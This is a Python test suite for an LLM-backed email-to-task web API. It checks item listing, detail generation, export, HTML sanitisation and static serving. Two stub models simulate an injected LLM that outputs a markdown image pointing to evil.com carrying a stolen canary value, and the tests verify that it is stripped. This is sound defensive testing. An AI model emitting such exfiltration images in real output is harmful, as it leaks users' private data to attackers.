"""REST API 测试：TestClient + 依赖覆盖指定当前用户。"""
import json
from datetime import datetime
from types import SimpleNamespace

from fastapi.testclient import TestClient
from sqlalchemy import select

from app.api import create_app
from app.auth import CurrentUser, require_auth
from app.config import Settings
from app.llm import LLMClient
from app.models import Account, Email, Item, User


class FakeDetailLLM:
    """详情生成（agentic 对话）的模型替身：直接返回合法最终 JSON。"""

    def __init__(self, related=None):
        self.detail_calls = 0
        self.related = list(related or [])

    def chat_completion(self, messages, tools=None, json_mode=False):
        self.detail_calls += 1
        return {
            "role": "assistant",
            "content": json.dumps({"detail_md": "**AI 详情**", "related": self.related}, ensure_ascii=False),
        }


def evil_openai_client(content: str) -> SimpleNamespace:
    """stub OpenAI SDK 客户端：chat.completions.create 固定返回被攻陷模型的输出。

    净化逻辑位于真实生产路径 app.detail 的 detail_md 后处理内（api.py 的
    monkeypatch 接口会绕过它），因此这里在 SDK 层注入「模型被完全攻陷、
    执意输出外泄图片」的原始输出，验证真实防御路径。
    """
    client = SimpleNamespace()
    client.chat = SimpleNamespace(
        completions=SimpleNamespace(
            create=lambda **kw: SimpleNamespace(
                choices=[
                    SimpleNamespace(
                        message=SimpleNamespace(content=content, tool_calls=None)  # SDK message 恒有 tool_calls 键
                    )
                ]
            )
        )
    )
    return client


class EvilSearchLLM:
    """被完全攻陷的搜索模型：第一轮就输出带外泄图片的最终答案。"""

    def chat_completion(self, messages, tools=None, json_mode=False):
        return {
            "role": "assistant",
            "content": json.dumps(
                {
                    "answer_md": "找到了：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)",
                    "citations": [],
                }
            ),
        }


def _settings() -> Settings:
    return Settings(database_path=":memory:", llm_base_url="http://x", llm_api_key="k")


def _seed(session_factory) -> tuple[int, int, int, int]:
    with session_factory() as s:
        s.add(User(sub="user-1", email="a@example.com", name="甲"))
        s.commit()
        acc = Account(user_sub="user-1", name="学校邮箱", kind="microsoft", email="a@example.com", status="ok")
        s.add(acc)
        s.commit()
        em = Email(
            account_id=acc.id, message_id="<m1>", subject="开学通知", sender="b@example.com",
            # sent_at 与 parser.py 一致：naive UTC
            sent_at=datetime(2026, 9, 4, 1, 2, 3), text_body="九月一号开学", html_body="<p>九月一号开学</p><script>x()</script>",
            llm_state="done",
        )
        em2 = Email(
            account_id=acc.id, message_id="<m2>", subject="旧邮件", sender="c@example.com",
            text_body="", html_body=None, llm_state="done",
        )
        pending = Email(
            account_id=acc.id, message_id="<m3>", subject="待处理", sender="d@example.com",
            text_body="", html_body=None, llm_state="pending",
        )
        s.add_all([em, em2, pending])
        s.commit()
        it = Item(
            email_id=em.id, user_sub="user-1", title="交学费", summary="s", category="学业", actionable=True,
            importance="high", status="open",
        )
        done = Item(
            email_id=em2.id, user_sub="user-1", title="旧任务", summary="s", category="工作", actionable=False,
            status="done",
        )
        s.add_all([it, done])
        s.commit()
        return acc.id, em.id, it.id, pending.id


def _client(session_factory, monkeypatch):
    app = create_app(settings=_settings(), session_factory=session_factory)
    app.dependency_overrides[require_auth] = lambda: CurrentUser(sub="user-1", email="a@example.com", name="甲")
    return TestClient(app)


def test_health_public(session_factory, monkeypatch):
    client = _client(session_factory, monkeypatch)
    resp = client.get("/api/health")
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


def test_items_list_and_filter(session_factory, monkeypatch):
    _seed(session_factory)
    client = _client(session_factory, monkeypatch)

    resp = client.get("/api/items")
    assert resp.status_code == 200
    items = resp.json()["items"]
    assert len(items) == 1  # 默认 open，done 被过滤
    assert items[0]["title"] == "交学费"
    assert items[0]["email_subject"] == "开学通知"
    assert items[0]["importance"] == "high"  # /api/items 响应含 importance
    assert items[0]["email_sent_at"] == "2026-09-04T01:02:03+00:00"  # naive UTC 补显式 +00:00 偏移
    assert items[0]["related"] == []  # 每项都带 related（未生成时为 []）

    resp = client.get("/api/items", params={"status": "done"})
    assert len(resp.json()["items"]) == 1
    assert resp.json()["items"][0]["title"] == "旧任务"
    assert resp.json()["items"][0]["importance"] == "normal"  # 未显式设置时默认 normal
    assert resp.json()["items"][0]["email_sent_at"] is None  # em2 未设 sent_at
    assert "related" in resp.json()["items"][0]

    resp = client.get("/api/items", params={"category": "学业"})
    assert len(resp.json()["items"]) == 1
    resp = client.get("/api/items", params={"category": "账单"})
    assert resp.json()["items"] == []


def test_patch_item_done_and_open(session_factory, monkeypatch):
    _acc, _em, item_id, _pending_id = _seed(session_factory)
    client = _client(session_factory, monkeypatch)

    resp = client.patch(f"/api/items/{item_id}", json={"status": "done"})
    assert resp.status_code == 200
    assert resp.json()["status"] == "done"
    assert resp.json()["done_at"] is not None

    resp = client.patch(f"/api/items/{item_id}", json={"status": "open"})
    assert resp.json()["status"] == "open"
    assert resp.json()["done_at"] is None

    resp = client.patch(f"/api/items/{item_id}", json={"status": "invalid"})
    assert resp.status_code == 400

    resp = client.patch("/api/items/999999", json={"status": "done"})
    assert resp.status_code == 404


def test_detail_lazy_generation_cached(session_factory, monkeypatch):
    _acc, _em, item_id, _pending_id = _seed(session_factory)
    fake = FakeDetailLLM()
    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: fake)
    client = _client(session_factory, monkeypatch)

    # 首次生成：detail_md + related 都返回
    resp = client.post(f"/api/items/{item_id}/detail")
    assert resp.status_code == 200
    assert resp.json()["detail_md"] == "**AI 详情**"
    assert resp.json()["related"] == []
    assert fake.detail_calls == 1

    # 二次命中缓存：不再调用 LLM
    resp = client.post(f"/api/items/{item_id}/detail")
    assert resp.status_code == 200
    assert fake.detail_calls == 1

    # GET 详情带 detail_md 与 related
    resp = client.get(f"/api/items/{item_id}")
    assert resp.json()["detail_md"] == "**AI 详情**"
    assert resp.json()["related"] == []


def test_export_item_text(session_factory, monkeypatch):
    """/export：无 LLM 调用，导出 Markdown 含 AI 见解、当前邮件与关联邮件。"""
    _acc, _em, item_id, _pending_id = _seed(session_factory)
    with session_factory() as s:
        em2_id = s.execute(select(Email.id).where(Email.message_id == "<m2>")).scalar_one()
    fake = FakeDetailLLM(related=[{"email_id": em2_id, "reason": "旧邮件背景"}])
    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: fake)
    client = _client(session_factory, monkeypatch)

    # 生成详情后：detail 响应含 related（富化后的邮件字段）
    resp = client.post(f"/api/items/{item_id}/detail")
    assert resp.status_code == 200
    assert fake.detail_calls == 1
    assert resp.json()["related"] == [
        {"email_id": em2_id, "subject": "旧邮件", "sender": "c@example.com",
         "sent_at": None, "reason": "旧邮件背景"}
    ]

    # 导出：AI 见解 + 当前邮件全文 + 关联邮件
    resp = client.get(f"/api/items/{item_id}/export")
    assert resp.status_code == 200
    text = resp.json()["text"]
    assert text.startswith("# 交学费")
    assert "分类：学业" in text
    assert "## AI 见解" in text and "**AI 详情**" in text
    assert "## 当前邮件" in text
    assert "九月一号开学" in text
    assert "## 关联邮件（1 封）" in text
    assert "### 1. 旧邮件" in text
    assert "关联原因：旧邮件背景" in text

    # GET /api/items 列表项也带 related
    resp = client.get("/api/items")
    assert resp.json()["items"][0]["related"][0]["email_id"] == em2_id


def test_detail_injection_image_is_sanitized(session_factory, monkeypatch):
    """模型被攻陷输出外泄图片：接口响应与落库的 detail_md 均不含图片语法（验收核心）。"""
    _acc, _em, item_id, _pending_id = _seed(session_factory)
    evil = json.dumps(
        {
            "detail_md": "详情：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)",
            "related": [],
        },
        ensure_ascii=False,
    )
    llm = LLMClient(base_url="http://x", api_key="k", model="m")
    llm.client = evil_openai_client(evil)
    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: llm)
    client = _client(session_factory, monkeypatch)

    resp = client.post(f"/api/items/{item_id}/detail")
    assert resp.status_code == 200
    assert "evil.com" not in resp.json()["detail_md"]
    assert "![" not in resp.json()["detail_md"]

    # 落库的 detail_md 同样已净化
    resp = client.get(f"/api/items/{item_id}")
    assert resp.status_code == 200
    assert "evil.com" not in resp.json()["detail_md"]
    assert "![" not in resp.json()["detail_md"]


def test_search_injection_image_is_sanitized(session_factory, monkeypatch):
    """模型被攻陷输出外泄图片：answer_md 接口吐不出图片语法（验收核心）。"""
    _seed(session_factory)
    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: EvilSearchLLM())
    client = _client(session_factory, monkeypatch)

    resp = client.post("/api/search", json={"question": "发票在哪里"})
    assert resp.status_code == 200
    assert "evil.com" not in resp.json()["answer_md"]
    assert "![" not in resp.json()["answer_md"]


def test_email_endpoint_sanitized_html(session_factory, monkeypatch):
    _acc, em_id, _item_id, pending_id = _seed(session_factory)
    client = _client(session_factory, monkeypatch)

    resp = client.get(f"/api/emails/{em_id}")
    assert resp.status_code == 200
    data = resp.json()
    assert data["text_body"] == "九月一号开学"
    assert data["html"] is not None
    assert "Content-Security-Policy" in data["html"]
    assert "img-src data: cid:" in data["html"]
    assert "script" not in data["html"]
    # 默认不含远程图片
    assert "https:" not in data["html"].split("img-src")[1].split(">")[0]

    resp = client.get(f"/api/emails/{em_id}", params={"remote_images": 1})
    assert "img-src data: cid: https:" in resp.json()["html"]

    # 无 html_body 的邮件 → html null
    resp = client.get(f"/api/emails/{pending_id}")
    assert resp.json()["html"] is None

    resp = client.get("/api/emails/999999")
    assert resp.status_code == 404


def test_status_endpoint(session_factory, monkeypatch):
    acc_id, _em, _item_id, _pending_id = _seed(session_factory)
    client = _client(session_factory, monkeypatch)

    resp = client.get("/api/status")
    assert resp.status_code == 200
    data = resp.json()
    assert data["accounts"] == [
        {"id": acc_id, "name": "学校邮箱", "kind": "microsoft", "email": "a@example.com",
         "status": "ok", "enabled": True, "last_sync_at": None, "last_error": None}
    ]
    # 每个账户都带整型 id，且与库中账户 id 一致
    assert all(isinstance(a["id"], int) for a in data["accounts"])
    assert [a["id"] for a in data["accounts"]] == [acc_id]
    assert data["pending_llm"] == 1  # 一封 llm_state=pending


def test_frontend_dist_static_serving(session_factory, tmp_path):
    """settings.frontend_dist 指定 dist 目录：静态文件直出 + SPA fallback + API 不受影响。"""
    dist = tmp_path / "dist"
    (dist / "assets").mkdir(parents=True)
    (dist / "index.html").write_text("<html>app</html>", encoding="utf-8")
    (dist / "assets" / "x.js").write_text("console.log(1)", encoding="utf-8")

    settings = Settings(database_path=":memory:", frontend_dist=str(dist))
    app = create_app(settings=settings, session_factory=session_factory)
    client = TestClient(app)

    # 静态文件直出
    resp = client.get("/assets/x.js")
    assert resp.status_code == 200
    assert resp.text == "console.log(1)"

    # 不存在路径 SPA fallback 到 index.html
    resp = client.get("/任意/路径")
    assert resp.status_code == 200
    assert resp.text == "<html>app</html>"

    # API 路由优先，不受 fallback 影响
    resp = client.get("/api/health")
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


def test_detail_html_only_email_body_extracted(session_factory, monkeypatch):
    """只有 html_body 的邮件：detail 端点把提取后的正文传给 LLM，而不是空串。"""
    with session_factory() as s:
        s.add(User(sub="user-1"))
        s.commit()
        acc = Account(user_sub="user-1", name="学校邮箱", kind="microsoft", email="a@example.com", status="ok")
        s.add(acc)
        s.commit()
        em = Email(
            account_id=acc.id, message_id="<html-only>", subject="纯HTML邮件", sender="b@example.com",
            sent_at=None, text_body="", html_body="<p>请在周五前提交实验报告</p>", llm_state="done",
        )
        s.add(em)
        s.commit()
        it = Item(email_id=em.id, user_sub="user-1", title="提交报告", summary="s", category="学业", actionable=True, status="open")
        s.add(it)
        s.commit()
        item_id = it.id

    captured: dict = {}

    class CapturingDetailLLM:
        def chat_completion(self, messages, tools=None, json_mode=False):
            captured["user_content"] = next(
                (m["content"] for m in messages if m.get("role") == "user"), ""
            )
            return {
                "role": "assistant",
                "content": json.dumps({"detail_md": "**AI 详情**", "related": []}, ensure_ascii=False),
            }

    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: CapturingDetailLLM())
    client = _client(session_factory, monkeypatch)

    resp = client.post(f"/api/items/{item_id}/detail")
    assert resp.status_code == 200
    assert resp.json()["detail_md"] == "**AI 详情**"
    content = captured["user_content"]
    assert "请在周五前提交实验报告" in content  # 提取后的正文进了 prompt
    assert "<p>" not in content  # 给 LLM 的是纯文本，不是 HTML 源码
